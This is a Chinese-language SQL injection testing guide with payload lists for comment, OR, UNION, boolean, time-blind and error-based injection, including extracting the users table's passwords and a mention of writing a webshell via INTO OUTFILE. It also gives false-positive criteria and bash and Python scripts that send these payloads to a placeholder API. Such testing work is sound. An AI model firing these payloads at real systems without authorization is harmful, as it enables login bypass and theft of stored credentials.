# SQL 注入测试

## 1. 概述

SQL 注入（SQL Injection）是一种通过将恶意 SQL 代码插入到输入参数中，进而影响后台数据库操作的攻击方式。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见注入点

| 参数位置 | 示例 | 说明 |
|----------|------|------|
| URL 查询参数 | `/user?id=1` | 路径参数 |
| POST Body | `username=xxx` | 表单参数 |
| HTTP Header | `X-Forwarded-For` | 请求头注入 |
| Cookie | `session_id=xxx` | Cookie 注入 |

### 2.2 危险关键词

```
search, query, id, page, user, name, pass,
keyword, id, item, cat, sort, order, filter
```

## 3. 测试 Payload

### 3.1 注释绕过

```bash
# 单行注释
username=admin'--
username=admin'#
username=admin'/*

# 多行注释
username=admin'/*xxx*/--
```

### 3.2 OR 绕过

```bash
# 万能密码
username=' OR '1'='1
username=admin' OR '1'='1
username=' OR 1=1--

# 利用 AND
username=admin' AND 1=1--
username=admin' AND 1=2--
```

### 3.3 UNION 注入

```bash
# 判断列数
username=admin' ORDER BY 1--
username=admin' ORDER BY 2--
username=admin' ORDER BY 3--  # 报错则列数为2

# 获取数据
username=admin' UNION SELECT null--
username=admin' UNION SELECT null,null--
username=admin' UNION SELECT 1,2,3--
username=admin' UNION SELECT username,password,null FROM users--
```

### 3.4 布尔注入

```bash
# 判断真假
username=admin' AND 1=1--
username=admin' AND 1=2--

# 获取字符
username=admin' AND SUBSTRING((SELECT password),1,1)='a'--
username=admin' AND ASCII(SUBSTRING((SELECT password),1,1))>100--
```

### 3.5 时间盲注

```bash
# MySQL
username=admin' AND SLEEP(3)--
username=admin' AND IF(1=1,SLEEP(3),0)--

# PostgreSQL
username=admin'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

# SQL Server
username=admin'; IF (1=1) WAITFOR DELAY '00:00:03'--
```

### 3.6 报错注入

```bash
# MySQL
username=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
username=admin' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--

# Oracle
username=admin' AND CTXSYS.DRITHSX.SN(user,(1))>0--
```

## 4. 数据库指纹识别

| 数据库 | 特征 |
|--------|------|
| MySQL | `LEN()`, `SUBSTRING()`, `SLEEP()` |
| PostgreSQL | `pg_sleep()`, `COPY` |
| SQL Server | `WAITFOR`, `CHARINDEX()` |
| Oracle | `CTXSYS.DRITHSX.SN()` |
| SQLite | `LIKE()`, `GLOB()` |

## 5. 判断方法

### 5.1 响应差异

```bash
# 假条件
GET /api/user?id=1 AND 1=2
# 响应：无数据或错误

# 真条件
GET /api/user?id=1 AND 1=1
# 响应：正常数据
```

### 5.2 SQL 错误特征

```json
{"error": "You have an error in your SQL syntax"}
{"error": "mysql_fetch"}
{"error": "ORA-01756"}
{"error": "Microsoft SQL Native Client error"}
```

## 6. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 认证绕过 | `' OR '1'='1` 绕过登录 |
| 数据泄露 | UNION 查询敏感表 |
| 命令注入 | SELECT INTO OUTFILE 写 Webshell |
| 横向移动 | 获取管理员密码 Hash |

## 7. 测试检查清单

```
□ 识别注入点（参数、Header、Cookie）
□ 测试注释绕过（'--, #, /**/）
□ 测试 OR 绕过（' OR '1'='1）
□ 测试 UNION 注入（判断列数、获取数据）
□ 测试布尔注入（SUBSTRING, ASCII）
□ 测试时间盲注（SLEEP, WAITFOR）
□ 测试报错注入（EXTRACTVALUE, UPDATEXML）
□ 识别数据库类型
□ 判断漏洞存在性
□ 利用漏洞获取数据
```

## 8. SQL注入误报判断标准

### 8.1 核心判断原则

```
【重要】不是所有特殊字符返回500都是SQL注入！

判断逻辑：
1. 先获取正常响应基准
2. 对比注入前后的响应差异
3. 差异必须是"SQL错误"而非"参数格式错误"

【真实SQL注入特征】
- 响应包含SQL错误关键字（syntax, mysql, oracle, sqlite等）
- 响应结构与正常响应不同（字段消失或增加）
- 时间盲注确认延时生效

【误报特征】
- 只是引号/单引号格式问题
- 返回"参数格式错误"而非数据库错误
- 响应与正常完全相同（被过滤或转义）
```

### 8.2 curl + 对比验证流程

```bash
# 1. 获取正常响应基准（必须先执行！）
curl -s "http://api/user?id=1" > sqli_baseline.json

# 2. 测试注入后的响应
curl -s "http://api/user?id=1'" > sqli_test1.json
curl -s 'http://api/user?id=1" OR "1"="1' > sqli_test2.json

# 3. 对比响应差异
diff sqli_baseline.json sqli_test1.json

# 4. SQL错误关键字检测
grep -iE "(mysql|sql|oracle|sqlite|postgresql|sybase|error in your sql|syntax error|warning|fatal)" sqli_test*.json

# 5. 判断标准
# - 正常响应与注入后响应完全相同 → 可能安全（被过滤）
# - 注入后响应包含SQL错误关键字 → 确认SQL注入
# - 注入后响应500但无SQL错误 → 可能是参数校验，非SQL注入
```

### 8.3 详细判断流程

```bash
#!/bin/bash
# SQL注入判断流程

TARGET="http://api/user"
NORMALResp=$(curl -s "${TARGET}?id=1")
NORMAL_LEN=${#NORMALResp}

echo "=== SQL注入误报判断 ==="
echo "正常响应长度: $NORMAL_LEN"
echo "正常响应: $NORMALResp"
echo ""

# 测试各种SQL注入payload
PAYLOADS=(
    "1'"
    "1 OR 1=1"
    "1' OR '1'='1"
    "1'--"
    "1'#"
    "1' ORDER BY 100--"
    "1' AND SLEEP(3)--"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing: ${TARGET}?id=${payload}"
    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}?id=${payload}")
    HTTP_CODE=$(echo "$RESP" | grep "HTTP_CODE:" | cut -d: -f2)
    BODY=$(echo "$RESP" | sed '/HTTP_CODE:/d')
    BODY_LEN=${#BODY}
    
    echo "  HTTP状态码: $HTTP_CODE"
    echo "  响应长度: $BODY_LEN"
    
    # 检查SQL错误关键字
    if echo "$BODY" | grep -qiE "(mysql|sql error|oracle|sqlite|postgresql|sybase|error in your sql|syntax error|warning|fatal|exception)"; then
        echo "  [确认SQL注入] 响应包含SQL错误关键字"
        echo "  错误信息: $(echo "$BODY" | grep -iE "(mysql|sql error|oracle|sqlite|postgresql|sybase|error in your sql|syntax error)" | head -1)"
    else
        # 检查响应差异
        if [[ "$BODY_LEN" -eq 0 ]]; then
            echo "  [可能安全] 返回空响应"
        elif [[ "$BODY" == "$NORMALResp" ]]; then
            echo "  [可能安全] 响应与正常相同（可能被过滤）"
        else
            echo "  [需进一步分析] 响应有差异但无SQL错误关键字"
            echo "  响应: ${BODY:0:200}..."
        fi
    fi
    echo ""
done
```

### 8.4 Python脚本（复杂场景）

```python
import requests
import time
import re

class SQLiTester:
    def __init__(self, target):
        self.target = target
        self.baseline = None
        
    def get_baseline(self, param, value):
        """获取正常响应基准"""
        resp = requests.get(f"{self.target}?{param}={value}")
        self.baseline = {
            'status': resp.status_code,
            'body': resp.text,
            'length': len(resp.text),
            'time': 0
        }
        return self.baseline
    
    def check_sqli_error(self, body):
        """
        检测响应中是否包含SQL错误
        
        【判断标准】
        1. 必须包含明确的数据库错误关键字
        2. 错误必须是"SQL相关"而非"参数格式错误"
        """
        sql_errors = [
            'mysql', 'mysqli', 'mariadb',
            'postgresql', 'postgres',
            'oracle', 'oci',
            'sqlite', 'sqlite3',
            'sql server', 'mssql',
            'sybase', 'db2',
            'error in your sql', 'sql syntax',
            'syntax error', 'sql error',
            'warning:', 'fatal:',
            'exception', 'stack trace',
            'oracle error', 'ora-',
            'microsoft sql native client',
            'ctsys.drithssx.sn',  # Oracle报错注入特征
            'extractvalue', 'updatexml',  # MySQL报错注入
        ]
        
        body_lower = body.lower()
        found_errors = []
        
        for error in sql_errors:
            if error.lower() in body_lower:
                found_errors.append(error)
        
        return found_errors
    
    def test_injection(self, param, payload, expected_time=None):
        """
        测试SQL注入
        
        Returns:
            (is_vuln, reason, details)
        """
        start = time.time()
        resp = requests.get(f"{self.target}?{param}={payload}", timeout=30)
        elapsed = time.time() - start
        
        # 1. 状态码检查
        if resp.status_code >= 500:
            # 500可能是注入导致数据库错误
            errors = self.check_sqli_error(resp.text)
            if errors:
                return True, f"SQL注入确认（500错误+SQL关键字: {errors}）", resp.text[:500]
            else:
                return False, "500错误但无SQL关键字，可能是参数校验失败", None
        
        # 2. 响应内容检查
        if self.baseline:
            if resp.text == self.baseline['body']:
                return False, "响应与正常响应完全相同（可能被过滤或转义）", None
            
            # 检查SQL错误
            errors = self.check_sqli_error(resp.text)
            if errors:
                return True, f"SQL注入确认（响应包含SQL错误关键字: {errors}）", resp.text[:500]
        
        # 3. 时间盲注检查
        if expected_time and elapsed >= expected_time:
            return True, f"时间盲注确认（延时{elapsed:.2f}秒）", None
        
        # 4. 响应长度异常检查
        if self.baseline:
            length_diff = abs(len(resp.text) - self.baseline['length'])
            if length_diff > 1000:  # 长度差异超过1000字节
                return True, f"响应长度异常变化（差异{length_diff}字节）", resp.text[:500]
        
        return False, "未发现SQL注入特征", None
    
    def run_tests(self, param, value="1"):
        """执行完整SQL注入测试"""
        print(f"\n=== SQL注入测试: {self.target}?{param}={value} ===\n")
        
        # 获取基准
        self.get_baseline(param, value)
        print(f"基准响应: {self.baseline['body'][:200]}...\n")
        
        # 测试payload
        payloads = [
            ("注释绕过", f"{value}'--"),
            ("OR绕过", f"{value}' OR '1'='1"),
            ("UNION探测", f"{value}' ORDER BY 100--"),
            ("时间盲注", f"{value}' AND SLEEP(3)--"),
            ("报错注入", f"{value}' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"),
        ]
        
        for name, payload in payloads:
            print(f"Testing: {payload}")
            is_vuln, reason, details = self.test_injection(param, payload, expected_time=3 if 'SLEEP' in payload else None)
            
            if is_vuln:
                print(f"  [VULN] {reason}")
                if details:
                    print(f"  响应片段: {details[:200]}")
            else:
                print(f"  [SAFE] {reason}")
            print()

# 使用示例
if __name__ == "__main__":
    tester = SQLiTester("http://api/user")
    tester.run_tests("id", "1")
```

## 9. 实战判断案例

### 案例1：参数格式错误 vs SQL注入

```
【场景】：请求 /api/user?id=1' 返回400

【curl测试】：
curl -s /api/user?id=1' 
# 返回: {"error": "Invalid parameter format"}

【判断】：
- 状态码: 400 (不是500)
- 响应内容: 参数格式错误（不是SQL错误）
- 结论: 【误报】只是参数校验，不是SQL注入

【正确做法】：
curl -s /api/user?id=1
# 返回: {"userId": 1, "name": "admin"}

对比后确认只是参数校验差异，不是SQL注入
```

### 案例2：真实SQL注入

```
【场景】：请求 /api/user?id=1' 返回500

【curl测试】：
curl -s /api/user?id=1'
# 返回: {"error": "You have an error in your SQL syntax; 
#        check the manual that corresponds to your MySQL server version..."}

【判断】：
- 状态码: 500
- 响应包含: "error in your SQL syntax", "MySQL"
- 结论: 【确认SQL注入】
```

### 案例3：被过滤的注入

```
【场景】：请求 /api/user?id=1' OR '1'='1 返回正常数据

【curl测试】：
curl -s /api/user?id=1' OR '1'='1
# 返回: {"userId": 1, "name": "admin"}

curl -s /api/user?id=1
# 返回: {"userId": 1, "name": "admin"}

【判断】：
- 两次响应完全相同
- 结论: 【误报】注入被过滤或转义，未触发漏洞
```
